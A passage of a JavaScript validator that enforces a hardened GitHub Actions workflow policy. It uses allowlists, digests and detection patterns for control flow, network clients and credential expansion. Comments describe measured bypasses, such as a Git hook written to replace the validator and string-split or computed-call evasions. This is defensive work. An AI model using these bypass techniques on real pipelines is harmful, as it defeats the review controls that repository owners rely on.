  // closed by one shared rule, which is the same rule build.verify uses.
  for (const call of assertLiteralStaticCalls(stepCode, 'acquire-policy', label)) {
    if (!REVIEWED_ACQUIRE_STATIC_CALLS.has(`${call[1]}::${call[2]}`.toLowerCase())) {
      reject('acquire-policy', `${label} calls an unreviewed static member: ${call[1]}::${call[2]}`);
    }
  }
  for (const objCmdlet of stepCode.matchAll(/\b([A-Z][a-z]+-[A-Z][A-Za-z]+)\b/gu)) {
    if (!REVIEWED_ACQUIRE_CMDLETS.has(objCmdlet[1].toLowerCase())) {
      reject('acquire-policy', `${label} invokes an unreviewed cmdlet: ${objCmdlet[1]}`);
    }
  }
  // Round 55, reported. The cmdlet allowlist above matches Verb-Noun names, so
  // a bare *native* command is neither a cmdlet nor an invocation through a
  // reviewed command variable and no rule saw it. Measured accepted with both
  // acquire digests re-baselined: creating .git/hooks, writing a post-checkout
  // hook with `printf ... > .git/hooks/post-checkout` and making it executable
  // with `chmod +x`. The reviewed checkout then runs the hook, which can
  // replace the validator with a zero-exit program before the policy job
  // invokes it. Neither printf nor chmod is a cmdlet, an interpreter, or a
  // network client, and the quoted hook body is blanked from the script-path
  // scan -- three separate rules each looking past it.
  //
  // Closed the way command position is closed everywhere else in this file:
  // positively. Audited on the projection, all three acquire steps use exactly
  // these eight tokens and nothing else.
  for (const objToken of stepCode.matchAll(MARKDOWN_COMMAND_POSITION)) {
    if (!REVIEWED_ACQUIRE_COMMANDS.includes(objToken[1])) {
      reject('acquire-policy', `${label} runs an unreviewed bare command: ${objToken[1]}`);
    }
  }
  // And the redirection that made the hook a file. The existing guard only
  // recognised destinations beginning with `$`; the reviewed steps redirect
  // nowhere at all, so any redirection is unreviewed.
  if (/[0-9]?>{1,2}(?!&)/u.test(stepCode)) {
    reject('acquire-policy', `${label} redirects output to a file`);
  }
  // Provenance for every reviewed command variable this step invokes. Only the
  // targets it actually uses are required, because verify.acquire invokes Git
  // and never curl or tar.
  const countOf = (haystack, needle) => haystack.split(needle).length - 1;
  for (const [strTarget, objBinding] of Object.entries(REVIEWED_COMMAND_BINDINGS)) {
    if (!stepCode.includes(`$${strTarget}`)) continue;
    // Exactly once: a second New-Variable for the same name is how a rebind
    // would be spelled once plain assignment is refused.
    if (countOf(stepCode, `New-Variable -Name ${strTarget} -Value $${objBinding.source} -Option Constant`) !== 1) {
      reject('acquire-policy', `${label} does not bind $${strTarget} exactly once as a reviewed constant`);
    }
    if (new RegExp(`\\$${strTarget}\\s*=`, 'u').test(stepCode)) {
      reject('acquire-policy', `${label} assigns $${strTarget} outside its reviewed constant binding`);
    }
    // The name may be mentioned unsigilled exactly once -- by the binding
    // itself. That refuses a second New-Variable, and Set-Variable and
    // Remove-Variable with it, whether they are spelled with -Name or
    // positionally. Measured, PowerShell already refuses to rebind a Constant
    // even with -Force, so this is not the thing standing between the step and
    // a hijack; it is asserted anyway because the alternative is resting on a
    // property of the host, which is the posture this step's own comment
    // rejects when it explains why the Git path is pinned.
    if ((stepCode.match(new RegExp(`(?<!\\$)\\b${strTarget}\\b`, 'gu')) ?? []).length !== 1) {
      reject('acquire-policy', `${label} names ${strTarget} outside its reviewed constant binding`);
    }
    // Binding to a constant is worth nothing if what it binds *from* is free,
    // so the resolution is pinned to its reviewed absolute paths. Asserted
    // against the raw text because the paths are string literals the projection
    // blanks by design -- the same split the generator's lookup check makes,
    // and for the same reason. A comment could satisfy this half alone, so the
    // assignment is also required to exist exactly once as code.
    const strResolve = `$${objBinding.source} = @(${objBinding.paths.map((p) => `'${p}'`).join(', ')}) | Where-Object { [System.IO.File]::Exists($_) } | Select-Object -First 1`;
    if (countOf(step.run, strResolve) !== 1) {
      reject('acquire-policy', `${label} does not resolve $${objBinding.source} from its reviewed absolute paths`);
    }
    if (countOf(stepCode, `$${objBinding.source} =`) !== 1) {
      reject('acquire-policy', `${label} assigns $${objBinding.source} more than once`);
    }
  }
  if (/[^\t\n\x20-\x7e]/u.test(step.run)) {
    reject('acquire-policy', `${label} contains a character outside printable ASCII`);
  }
  if (/--%/u.test(step.run)) {
    reject('acquire-policy', `${label} uses the stop-parsing token`);
  }
  if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== expected.digest) {
    reject('acquire-policy', `${label} script does not match its reviewed digest`);
  }
}

function validateCredentialCleanupStep(step, label) {
  assertKeys(step, ['name', 'id', 'shell', 'run'], label);
  if (step.name !== 'Verify checkout credential cleanup' || step.shell !== 'pwsh') {
    reject('credential-policy', `${label} execution contract changed`);
  }
  const requiredSequences = [
    // The origin pair was covered only by the digest added alongside it, and a
    // digest is re-baselined by design on every reviewed edit -- so the one
    // control protecting them was the one guaranteed to be replaced. Both are
    // named here, ahead of that digest, with isolating fixtures. Cardinality
    // first: more than one origin URL means the checks below inspect one remote
    // while Git could use another. Then the shape: the URL must carry no
    // credential, which is what makes the absent helper and absent extraheader
    // below sufficient rather than merely consistent.
    ['exactly one origin URL',
      '$arrRemoteUrls = @(& $strGitPath remote get-url --all origin)\n' +
      'if ($LASTEXITCODE -ne 0 -or $arrRemoteUrls.Count -ne 1) {'],
    ['a credential-free GitHub HTTPS origin',
      "if ($arrRemoteUrls[0] -notmatch '^https://github\\.com/[^/@]+/[^/@]+(?:\\.git)?$') {"],
    // Both accepted absent-key statuses below are only reachable when native
    // commands are not mapped onto $ErrorActionPreference.
    ['native-command error mapping is disabled',
      'if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n' +
      '    $PSNativeCommandUseErrorActionPreference = $false\n' +
      '}'],
    ['no local credential helper',
      '$arrHelpers = @(& $strGitPath config --local --get-all credential.helper)\n' +
      '$intHelperExit = $LASTEXITCODE\n' +
      '$global:LASTEXITCODE = 0\n' +
      'if (($intHelperExit -ne 0 -and $intHelperExit -ne 1) -or $arrHelpers.Count -ne 0)'],
    ['no persisted HTTP authorization',
      "$arrAuthorizationKeys = @(& $strGitPath config --local --name-only --get-regexp '^http\\..*\\.extraheader$')\n" +
      '$intAuthorizationExit = $LASTEXITCODE\n' +
      '$global:LASTEXITCODE = 0\n' +
      'if (($intAuthorizationExit -ne 0 -and $intAuthorizationExit -ne 1) -or $arrAuthorizationKeys.Count -ne 0)'],
  ];
  // Named rather than positional. One shared message for every sequence meant a
  // fixture could only prove that some required sequence was missing, not which
  // -- and telling those apart is the whole point of stating what a fixture
  // expects.
  for (const [requirement, sequence] of requiredSequences) {
    if (!step.run.includes(sequence)) {
      reject('credential-policy', `${label} no longer asserts ${requirement}`);
    }
  }
  const normalizationCount = step.run.match(/^\$global:LASTEXITCODE = 0$/gmu)?.length ?? 0;
  if (normalizationCount !== 2) {
    reject('credential-policy', `${label} native-status normalization count changed`);
  }
  // Every check above asks whether a sequence is present, and presence is not
  // execution. Prepending exit 0 leaves all of them satisfied while PowerShell
  // returns before either credential assertion runs, and this step had neither
  // of the two controls that answer that elsewhere: a control-flow rejection
  // and a complete-script digest. It has both now, for the same reason the
  // generate-and-verify step does. This script defines no functions, so the
  // tokens are matched anywhere rather than in statement position only.
  // PROCESS_TERMINATION is applied here too. The token ban above happens to
  // catch [Environment]::Exit through the word Exit, but it does not catch
  // SetShouldExit, where the word boundary falls inside the name; relying on
  // that coincidence would leave the class half-covered.
  // return and trap were in the acquire ban and not this one. A top-level
  // return exits the script successfully before the origin, credential-helper
  // and authorization-header assertions run, which is precisely the bypass this
  // ban exists to refuse; the two lists should not have differed.
  if (/\b(?:exit|return|break|continue|trap)\b/iu.test(step.run) || PROCESS_TERMINATION.test(step.run)) {
    reject('credential-policy', `${label} adds control flow that can bypass a required assertion`);
  }
  if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== REVIEWED_CREDENTIAL_STEP_DIGEST) {
    reject('credential-policy', `${label} script does not match its reviewed digest`);
  }
}

// Every assertion that holds for both governed steps, so the two jobs cannot
// diverge in what is checked of them. The tails differ and the preludes do not:
// each step establishes the same supply position, and then one runs the
// validator and the other runs the linters.
function validateMarkdownGovernedStep(step, label, expected) {
  assertKeys(step, ['name', 'id', 'shell', 'working-directory', 'run'], label);
  if (step.name !== expected.name || step.shell !== 'pwsh' || step['working-directory'] !== '.github/workflows') {
    reject('policy', `${label} execution context changed`);
  }
  const requiredFragments = [
    "-cne 'v24.18.1'",
    "-cne '11.16.0'",
    'if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {',
    'ci --ignore-scripts --no-audit --no-fund',
    'Get-FileHash -LiteralPath package.json -Algorithm SHA256',
    'Get-FileHash -LiteralPath package-lock.json -Algorithm SHA256',
    // Derived from the reviewed constants so the pre-install gate in the
    // workflow and the policy baseline here cannot drift apart silently.
    REVIEWED_PACKAGE_DIGESTS['package.json'].toUpperCase(),
    REVIEWED_PACKAGE_DIGESTS['package-lock.json'].toUpperCase(),
    'if ($strPackageBefore -cne $strReviewedPackageHash -or $strLockBefore -cne $strReviewedLockHash)',
    'supply: package metadata does not match the reviewed supply digest',
    'npm-ci: package metadata changed during frozen installation',
    // Neither reviewed digest covers .npmrc, and no governed YAML mentions it,
    // so script-shell there is a lint bypass that leaves every other check green.
    "@('.npmrc', '../.npmrc', '../../.npmrc')",
    'supply: repository-controlled npm configuration is present',
    // npm also reads a per-user and a global config outside the repository
    // tree; script-shell in either replaces the interpreter for every npm run.
    '$env:npm_config_userconfig =',
    '$env:npm_config_globalconfig =',
    "$env:npm_config_userconfig = '/dev/null'",
    "$env:npm_config_globalconfig = '/etc/npmrc-absent-by-policy'",
    'supply: the neutralized global npm configuration is not under a root-owned directory',
    'supply: the neutralized npm configuration source is not empty',
  ];
  for (const fragment of [...requiredFragments, ...expected.fragments]) {
    if (!step.run.includes(fragment)) reject('markdown-policy', `${label} is missing a required phase: ${fragment}`);
  }
  // Token presence alone cannot prove a phase runs. An inserted early exit
  // leaves every required fragment in place while skipping the phases below it,
  // so the step would report success without linting or re-checking metadata.
  // Neither script defines a function, so these tokens have no legitimate use.
  // Matched only in statement position — at the start of a line or directly
  // after ; or { — so the word "exit" inside a throw message is not a hit.
  if (/^[ \t]*(?:exit|return|break|continue)\b|[;{][ \t]*(?:exit|return|break|continue)\b/imu.test(step.run)) {
    reject('markdown-policy', `${label} adds control flow that can bypass a required phase`);
  }
  // Statement position cannot see [Environment]::Exit(0), because the token
  // follows :: rather than starting a statement. These steps also restore
  // $env:CI in a finally block, which that call would skip. See
  // PROCESS_TERMINATION for the enumeration and why it closes.
  if (PROCESS_TERMINATION.test(step.run)) {
    reject('markdown-policy', `${label} adds a process-termination path that can bypass a required phase`);
  }
  // Presence is order-independent; the phases must also run in the reviewed
  // sequence, so a later phase cannot be hoisted above the gate that guards it.
  let cursor = -1;
  for (const phase of expected.phases) {
    const at = step.run.indexOf(phase, cursor + 1);
    if (at <= cursor) reject('markdown-policy', `${label} runs a required phase out of order: ${phase}`);
    cursor = at;
  }
  // The network ban is per step rather than per file, and it always should
  // have been. Its stated rationale -- that no governed step performs network
  // I/O -- was already untrue: npm ci fetches the whole dependency tree in both
  // of these. What the rule actually protects is that the steps running
  // repository-controlled code have no client of their own, and that is
  // asserted where it is true. The acquire step is exempt because it downloads
  // the Node distribution, and the exemption is paired with a replacement
  // rather than left open: its URL and the expected archive digest are reviewed
  // constants asserted above, so what it may fetch is fixed and what it accepts
  // back is fixed. It also runs before any repository code, so nothing it could
  // be steered by has executed yet.
  if (NETWORK_CLIENT.test(powerShellTokenView(step.run))) {
    reject('markdown-policy', `${label} adds a network client`);
  }
  // The credential scan and the expression ban were added to build.yml's script
  // steps and not to this one, so the invariant "no governed script step
  // contains an expression" held in one file and not the other -- a fix applied
  // to the instance rather than the class, which is the mistake this pull
  // request has now made often enough to assert against.
  const serialized = JSON.stringify(step);
  if (/secrets\./iu.test(serialized) ||
      /GITHUB_TOKEN/iu.test(serialized) ||
      /github\.token/iu.test(serialized)) {
    reject('markdown-policy', `${label} expands an unapproved credential`);
  }
  if (/\$\{\{/u.test(serialized)) {
    reject('markdown-policy', `${label} contains a workflow expression`);
  }
  if (/@['"]|<#/u.test(step.run)) {
    reject('markdown-policy', `${label} uses a here-string or block comment`);
  }
  // Every phase in these steps reports by throwing, and the one try in each
  // exists to restore the caller's CI variable in finally, not to handle
  // anything. A catch anywhere here turns a failed supply digest, a failed
  // frozen install, a failed policy run or a failed lint into a step that
  // succeeds having decided nothing, and a trap does the same for the whole
  // script from wherever it is written. The verify step bounds catch by
  // position because it has one legitimate catch; these have none, so both are
  // refused outright.
  //
  // Read from the projection, not the raw text. On the raw text this rule
  // forbids explaining itself: a comment recording *why* a catch is refused
  // here trips it, which is the same prose-versus-code confusion the generator
  // guard hit. The projection blanks comments and string content, so the ban
  // now applies to catch and trap as constructs rather than as words.
  if (/\b(?:catch|trap)\b/iu.test(powerShellCodeProjection(step.run))) {
    reject('markdown-policy', `${label} can suppress a phase failure`);
  }
  if (/[^\t\n\x20-\x7e]/u.test(step.run)) {
    reject('markdown-policy', `${label} contains a character outside printable ASCII`);
  }
  if (/--%/u.test(step.run)) {
    reject('markdown-policy', `${label} uses the stop-parsing token`);
  }
  // Each captured phase status must be assigned exactly once, from $LASTEXITCODE.
  // Otherwise a later reassignment such as "$intPolicyExit = 0" leaves every
  // fragment, ordering, and command count intact while the deferred final check
  // sees only zeros and reports success over a failed phase.
  // Round 53. The generator's Git-path count had exactly this defect reported
  // against it, and the same count here was left alone -- measured accepted:
  // `$local:intPolicyExit = 0`, `$private:intPolicyExit = 0` and
  // `${intPolicyExit} = 0` each zero the captured status while this count sees
  // nothing, in both governed steps. Round 46 made the braced correction for
  // ${env:NAME} and round 53 made it again for ${strGitPath}; this is the third
  // place it was owed and the second time I failed to carry it across.
  //
  // Qualified writes are refused as a class just below, so the count itself
  // only has to learn the braced spelling.
  // The qualifier as a class. Env: is the one these steps legitimately write,
  // and it has its own allowlist above; every other qualifier -- scope modifier
  // or provider, in either spelling and any case -- reaches a variable some
  // count here is holding, so none is admitted. Audited: env: is the only
  // qualified assignment target in either governed step.
  //
  // Ahead of the count for the reason its generator counterpart is: round 54
  // made the count qualifier-aware, so both rules now catch a qualified write
  // and the specific message is the one worth reporting.
  for (const objMatch of powerShellCodeProjection(step.run).matchAll(QUALIFIED_ASSIGNMENT)) {
    const strTarget = objMatch[1] ?? objMatch[2];
    if (!strTarget.startsWith('env:')) {
      reject('markdown-policy', `${label} writes an unreviewed qualified variable: ${strTarget}`);
    }
  }
  for (const strName of expected.capturedStatuses) {
    const arrAssignments = normalizeLineContinuations(step.run).match(variableWritePattern(strName)) ?? [];
    if (arrAssignments.length !== 1) {
      reject('markdown-policy', `${label} captured phase status ${strName} is not assigned exactly once`);
    }
    if (!step.run.includes(`$${strName} = $LASTEXITCODE`)) {
      reject('markdown-policy', `${label} captured phase status ${strName} is not taken from $LASTEXITCODE`);
    }
  }
}

// Round 44, findings B and C, which are one defect seen from both jobs. The
// cross-job separation rules test raw text for './Validate-WorkflowPolicy.mjs'
// and for 'run lint:md'. Measured with the edited step's digest re-baselined --
// the premise both findings state -- these were accepted:
//
//   lint job:   $strValidatorPath = './Validate-' + 'WorkflowPolicy.mjs'
//               & $strNodePath $strValidatorPath ./build.yml ./markdownlint.yml
//   policy job: & $strNpmPath run ('lint:' + 'md')
//
// Neither string appears contiguously, so neither rule sees it, and each puts
// the program back on the runner the split exists to keep it off. Matching
// harder would lose to the next spelling, which is the control that has failed
// repeatedly on this branch. So the invocation surface of a governed step is
// closed the way the acquire steps' already is: positively.
//
// Every line that invokes anything must be one of the reviewed invocations,
// and the multiset must match exactly -- so a second copy of a permitted
// invocation is refused too. Whole lines rather than parsed arguments, because
// two of these sit inside an assignment and a sub-expression, and a rule that
// has to understand PowerShell's grammar to say what an argument is would be a
// new place to be wrong. Which lines invoke is decided on the projection, so a
// call operator inside a comment or a string is not one; the comparison is
// against the raw line, so nothing can hide in what the projection blanks.
function assertMarkdownStepInvocations(step, label, expected) {
  const projected = powerShellCodeProjection(step.run).split('\n');
  const raw = step.run.split('\n');
  const observed = [];
  for (let index = 0; index < projected.length; index += 1) {
    if (invocationOperatorOffset(projected[index]) >= 0) observed.push(raw[index].trim());
  }
  const remaining = [...expected.invocations];
  for (const invocation of observed) {
    const at = remaining.indexOf(invocation);
    if (at < 0) {
      // Reviewed but already used is a different failure from never reviewed,
      // and saying which one it is decides where to look: a duplicate is a
      // permitted command doing an unreviewed thing, an unknown line is a
      // command that was never reviewed at all.
      const known = expected.invocations.includes(invocation);
      reject('markdown-policy', known
        ? `${label} repeats a reviewed invocation: ${invocation}`
        : `${label} makes an unreviewed invocation: ${invocation}`);
    }
    remaining.splice(at, 1);
  }
  if (remaining.length !== 0) {
    reject('markdown-policy', `${label} no longer makes a reviewed invocation: ${remaining[0]}`);
  }
}

// Round 45, findings B and C. The two halves of the governed step's surface
// that the invocation allowlist above does not cover: what runs without a call
// operator, and what the step puts into the environment of everything it runs.
//
// Both are positive lists for the same reason the invocation allowlist is one.
// The alternative -- refusing `npm`, refusing `NODE_OPTIONS` -- loses to the
// next spelling, and on this branch it has, repeatedly.
function assertMarkdownStepSurface(step, label, expected) {
  const stepCode = powerShellCodeProjection(step.run);
  // Command position. A bare token here is an invocation by literal name, so
  // neither the & scan nor anything else sees it.
  for (const command of stepCode.matchAll(MARKDOWN_COMMAND_POSITION)) {
    const token = command[1];
    if (MARKDOWN_STEP_KEYWORDS.includes(token)) continue;
    if (MARKDOWN_STEP_COMMANDS.includes(token)) continue;
    reject('markdown-policy', `${label} runs an unreviewed bare command: ${token}`);
  }
  // Environment writes, in either spelling. Read from the projection so a
  // variable name inside a throw message is not mistaken for an assignment.
  for (const write of stepCode.matchAll(MARKDOWN_ENV_WRITE)) {
    if (!expected.envWrites.includes(write[1])) {
      reject('markdown-policy', `${label} assigns an unreviewed environment variable: ${write[1]}`);
    }
  }
  // Supply gates: present, once, and at the depth they were reviewed at, so an
  // enclosing block cannot keep the text while removing the behaviour.
  const arrGates = expected.stepId === 'lint'
    ? [...REVIEWED_MARKDOWN_GATES, ...REVIEWED_LINT_GATES]
    : REVIEWED_MARKDOWN_GATES;
  assertReviewedGuards(stepCode, arrGates, 'markdown-policy', (kind, frag) => kind === 'missing'
    ? `${label} no longer performs a reviewed supply gate: ${frag}`
    : `${label} supply gate is no longer reachable where it was reviewed: ${frag}`);
  // Execution that names no command and uses no operator.
  if (MARKDOWN_DYNAMIC_EXECUTION.test(stepCode)) {
    reject('markdown-policy', `${label} adds a dynamic or indirect execution path`);
  }
  // $env:NAME is the only spelling the scan above can see. The computed forms
  // reach the same variables without ever writing the name, so -- as in the
  // acquire steps, where this argument was made first -- the capability is
  // removed rather than its spellings enumerated. Set-Item, New-Item and
  // Set-Variable are already excluded by the command list above; these are the
  // static-method forms, which never appear at command position.
  if (/GetEnvironmentVariable|SetEnvironmentVariable/iu.test(stepCode)) {
    reject('markdown-policy', `${label} resolves an environment variable through a computed name`);
  }
  // Round 56, carried here rather than reported here. The `::` closure was
  // reported against build.verify; measured, both of these steps accepted a
  // computed member and a type held in a variable too, because the denylist
  // above names execution APIs and neither form has to spell one -- the walk
  // measured was `$typ = [System.IO.File]; $typ::Copy(...)` over the validator's
  // own bytes. There is no allowlist to consult here, so the form alone is
  // closed: what these steps may CALL stays governed by the denylist, and how
  // they may reach any static member at all is now governed the same way
  // everywhere. Audited: 9 well-formed calls in each, total `::` equal.
  assertLiteralStaticCalls(stepCode, 'markdown-policy', label);
}

// Closing backstop, the same shape as the one on the verify step. The named
// assertions are kept because they say what changed; this pins everything they
// do not model -- an indirect write to a captured status through Set-Variable,
// New-Variable, the Variable: provider, or a [ref] handle, none of which
// contain the assignment syntax counted above.
//
// Split out of the assertions it stands behind and run after the cross-job
// structure below, because a digest taken first answers every mutation with
// "the bytes moved" and no fixture can then isolate the rule it targets. That
// is the masking defect this suite already corrects for elsewhere, and adding
// a second governed step would have reintroduced it for every cross-job rule.
function assertMarkdownStepDigest(step, label, expected) {
  if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== expected.digest) {
    reject('markdown-policy', `${label} does not match its reviewed digest`);
  }
}

export function validateMarkdownPolicy(workflow, source) {
  assertKeys(workflow, ['name', 'on', 'permissions', 'jobs'], 'markdown root');
  if (workflow.name !== 'Markdown Lint') reject('policy', 'Markdown workflow name is not locked');
  assertEqual(workflow.on, EXPECTED_TRIGGER, 'Markdown triggers');
  assertEqual(workflow.permissions, { contents: 'read' }, 'Markdown workflow permissions');
  // Two jobs, and exactly two. Merging them back into one would reintroduce the
  // ordering choice the split exists to remove, and a third job would be an
  // unreviewed program on the same commit.
  assertKeys(workflow.jobs, ['policy', 'markdownlint'], 'Markdown jobs');

  const governed = {};
  for (const [jobId, expected] of Object.entries(MARKDOWN_JOBS)) {
    const label = `markdown.${jobId}`;
    const job = workflow.jobs[jobId];
    // The key set is what refuses a needs: edge. These are independent
    // assertions about one commit and neither is a precondition of the other,
    // so an edge between them would buy nothing and would let the first
    // failure hide the second. It is refused structurally rather than by a
    // named rule because every other job key is refused the same way.
    assertKeys(job, ['runs-on', 'permissions', 'steps'], label);
    if (job['runs-on'] !== 'ubuntu-latest') reject('policy', `${label} runner changed`);
    // Same two rules as build.verify, and for the same reason in the same
    // order. No scopes, because these jobs run repository-controlled code; and
    // no actions, because the scopes are not what the exposure runs on. A
    // JavaScript action receives ACTIONS_RUNTIME_TOKEN from the job's system
    // connection whatever the permissions map says, and its post step executes
    // after the job has run repository code. Removing the actions is what
    // removes the credential from the job.
    assertEqual(job.permissions, {}, `${label} job permissions`);
    for (const step of job.steps) {
      if ('uses' in step) reject('isolation-policy', `${label}.${step.id} uses an action`);
    }
    assertEqual(job.steps.map((step) => step?.id), ['acquire', expected.stepId], `${label} step order`);
    // Asserted once per job rather than once per file. Each job is a separate
    // runner with a separate empty workspace, so each has to fetch the
    // triggering revision and the pinned toolchain for itself -- and each is
    // held to the same reviewed digest, which is what makes the two copies
    // provably identical rather than merely similar.
    validateAcquireStep(findStep(job, 'acquire', label), `${label}.acquire`, MARKDOWN_ACQUIRE);
    governed[jobId] = findStep(job, expected.stepId, label);
  }
  for (const [jobId, expected] of Object.entries(MARKDOWN_JOBS)) {
    validateMarkdownGovernedStep(governed[jobId], `markdown.${jobId}.${expected.stepId}`, expected);
  }

  // The supply prelude is required to be byte-identical across the two jobs,
  // not merely to satisfy the same fragment list twice. Splitting one step into
  // two created a second copy of the toolchain pin, the reviewed package gate
  // and the npm configuration neutralization, and a second copy is a second
  // place to drift: a weakening applied to one job only would leave every
  // fragment assertion above satisfied in both.
  const preludeOf = (step, label) => {
    const at = step.run.indexOf(MARKDOWN_PRELUDE_END);
    if (at < 0 || step.run.indexOf(MARKDOWN_PRELUDE_END, at + 1) >= 0) {
      reject('markdown-policy', `${label} does not close its supply prelude exactly once`);
    }
    return step.run.slice(0, at + MARKDOWN_PRELUDE_END.length);
  };
  if (preludeOf(governed.policy, 'markdown.policy.validate') !==
      preludeOf(governed.markdownlint, 'markdown.markdownlint.lint')) {
    reject('markdown-policy', 'the two governed steps do not share one byte-identical supply prelude');
  }

  // Only in the lint job, which is the only job that runs them. A second
  // invocation of either script is how a re-baselined step would lint a
  // narrower surface and then lint the reviewed one to produce a clean log.
  if ((governed.markdownlint.run.match(/^\s*& \$strNpmPath run lint:md\s*$/gmu) ?? []).length !== 1 ||
      (governed.markdownlint.run.match(/^\s*& \$strNpmPath run lint:md:nested\s*$/gmu) ?? []).length !== 1) {
    reject('markdown-policy', 'markdown.markdownlint.lint must run each locked lint script exactly once');
  }
  // The validator runs in exactly one job, and it is the job with no linter in
  // it. An invocation added to the lint job would put it back on a runner where
  // package code has executed, which is the whole exposure the split closes.
  if (governed.markdownlint.run.includes('Validate-WorkflowPolicy.mjs')) {
    reject('markdown-policy', 'markdown.markdownlint.lint invokes the policy validator');
  }
  // And the linters run in exactly one job, which is the job the validator is
  // not in. A lint phase added to the policy job would execute package code on
  // the runner that then validates policy -- the other direction of the same
  // exposure.
  if (/run lint:md/u.test(governed.policy.run)) {
    reject('markdown-policy', 'markdown.policy.validate runs a lint phase');
  }
  // After the two rules above, so a linter or a validator placed in the wrong
  // job reports as the separation failure it is rather than as an unreviewed
  // invocation. This is the closing net beneath them: it does not care how the
  // command was spelled, only that the step invokes exactly what it was
  // reviewed to invoke.
  for (const [jobId, expected] of Object.entries(MARKDOWN_JOBS)) {
    assertMarkdownStepInvocations(governed[jobId], `markdown.${jobId}.${expected.stepId}`, expected);
  }
  // After the invocation allowlist, so a re-spelled *reviewed* command still
  // reports as the allowlist failure it is, and this reports only what the
  // allowlist structurally cannot see.
  for (const [jobId, expected] of Object.entries(MARKDOWN_JOBS)) {
    assertMarkdownStepSurface(governed[jobId], `markdown.${jobId}.${expected.stepId}`, expected);
  }
  // Last of all, so every rule above can be isolated by a fixture.
  for (const [jobId, expected] of Object.entries(MARKDOWN_JOBS)) {
    assertMarkdownStepDigest(governed[jobId], `markdown.${jobId}.${expected.stepId}`, expected);
  }

  if (/continue-on-error/iu.test(source)) {
    reject('markdown-policy', 'Markdown workflow weakens failure policy');
  }
  // Zero. These jobs run repository code, so the file contains no action at all
  // -- the same structural rule build.yml's verify job carries, asserted the
  // same two ways: no uses key on any step, and no pinned action anywhere in
  // the file.
  validateActionMultiset(source, []);
}

export function validateDependabotPolicy(value) {
  assertEqual(value, {
    version: 2,
    updates: [{
      'package-ecosystem': 'github-actions',
      directory: '/',
      schedule: { interval: 'weekly' },
    }],
  }, 'Dependabot configuration');
}

// Semantic assertions run before the digest so that an edit to a modelled field
// fails with the reason it failed. The digest is the closing backstop for any
// byte change the assertions above do not model.
export function validatePackagePolicy(packageSource, lockSource) {
  let manifest;
  let lock;
  try {
    manifest = JSON.parse(packageSource);
    lock = JSON.parse(lockSource);
  } catch {
    reject('supply-policy', 'package metadata is not parseable JSON');
  }

  assertEqual(manifest.scripts, REVIEWED_SCRIPTS, 'package.json scripts');
  assertEqual(manifest.devDependencies, REVIEWED_DEV_DEPENDENCIES, 'package.json devDependencies');
  if (manifest.private !== true) reject('supply-policy', 'package.json is not marked private');
  if (manifest.dependencies !== undefined) reject('supply-policy', 'package.json declares runtime dependencies');

  if (lock.lockfileVersion !== 3) reject('supply-policy', 'lockfile version is not the reviewed value');
  assertEqual(lock.packages?.['']?.devDependencies, REVIEWED_DEV_DEPENDENCIES, 'lockfile root devDependencies');
  const parser = lock.packages?.['node_modules/yaml'];
  if (parser === null || typeof parser !== 'object' || Array.isArray(parser)) {
    reject('supply-policy', 'lockfile does not resolve the yaml parser');
  }
  for (const [field, expected] of Object.entries(REVIEWED_PARSER)) {
    if (parser[field] !== expected) reject('supply-policy', `resolved yaml parser ${field} is not the reviewed value`);
  }

  for (const [label, source] of [['package.json', packageSource], ['package-lock.json', lockSource]]) {
    const digest = createHash('sha256').update(source, 'utf8').digest('hex');
    if (digest !== REVIEWED_PACKAGE_DIGESTS[label]) {
      reject('supply-policy', `${label} does not match its reviewed digest`);
    }
  }
}

export function parseGeneratorVersion(source, expectedVersion = undefined) {
  const firstFunction = source.search(/^function\s+/mu);
  if (firstFunction < 0) reject('invalid-version', 'generator has no first function boundary');
  const header = source.slice(0, firstFunction);
  const allMarkers = [...source.matchAll(/^Version:\s*(.*)$/gmu)];
  const headerMarkers = [...header.matchAll(/^Version:\s*(.*)$/gmu)];
  if (allMarkers.length !== 1 || headerMarkers.length !== 1) {
    reject('invalid-version', 'exactly one marker must occur in script help before the first function');
  }
  const notesStart = header.indexOf('.NOTES');
  const helpEnd = header.indexOf('#>', notesStart);
  if (notesStart < 0 || helpEnd < 0 || headerMarkers[0].index < notesStart || headerMarkers[0].index > helpEnd) {
    reject('invalid-version', 'the marker is outside script-level .NOTES');
  }

  const raw = headerMarkers[0][1];
  const match = raw.match(/^([0-9]+)\.([0-9]+)\.([0-9]{8})\.([0-9]+)$/u);
  if (!match) reject('invalid-version', 'marker grammar is invalid');
  for (const component of match.slice(1)) {
    if (component.length > 1 && component.startsWith('0')) reject('invalid-version', 'a component has a leading zero');
    const value = Number(component);
    if (!Number.isSafeInteger(value) || value > 2147483647) reject('invalid-version', 'a component is out of range');
  }
  const year = Number(match[3].slice(0, 4));
  const month = Number(match[3].slice(4, 6));
  const day = Number(match[3].slice(6, 8));
  const date = new Date(Date.UTC(year, month - 1, day));
  if (date.getUTCFullYear() !== year || date.getUTCMonth() + 1 !== month || date.getUTCDate() !== day) {
    reject('invalid-version', 'build is not a real Gregorian date');
  }
  const canonical = match.slice(1).map((component) => String(Number(component))).join('.');
  if (canonical !== raw) reject('invalid-version', 'version does not round-trip canonically');
  if (expectedVersion !== undefined && canonical !== expectedVersion) {
    reject('unexpected-version', 'valid generator version does not match the trusted reviewed version');
  }
  return canonical;
}

function replaceOnce(source, from, to) {
  if (!source.includes(from)) reject('fixture-harness', `fixture source token is absent: ${from}`);
  return source.replace(from, to);
}

// The two Markdown jobs share a byte-identical acquire step and supply prelude,
// so most anchors now match twice and replaceOnce silently takes the first --
// the policy job. That is the right target for most fixtures and the wrong one
// for any fixture whose recorded meaning names the lint step, and it would also
// leave the lint job's call site of every shared assertion unexercised. This
// takes the second occurrence, and refuses to build the mutation if there is no
// second occurrence to take, so a fixture cannot quietly become a duplicate of
// its policy-job twin.
function replaceLast(source, from, to) {
  const at = source.lastIndexOf(from);
  if (at < 0) reject('fixture-harness', `fixture source token is absent: ${from}`);
  if (source.indexOf(from) === at) reject('fixture-harness', `fixture source token occurs only once: ${from}`);
  return source.slice(0, at) + to + source.slice(at + from.length);
}

// Append-only inventory: existing IDs and meanings must never be reused.
// IDs retired when the temporary writer was deleted are not reissued; gaps in
// the BUILD sequence are deliberate. T1-BUILD-025 and T1-BUILD-026 were retired
// with them when publishing moved to its own job: both asserted on the upload
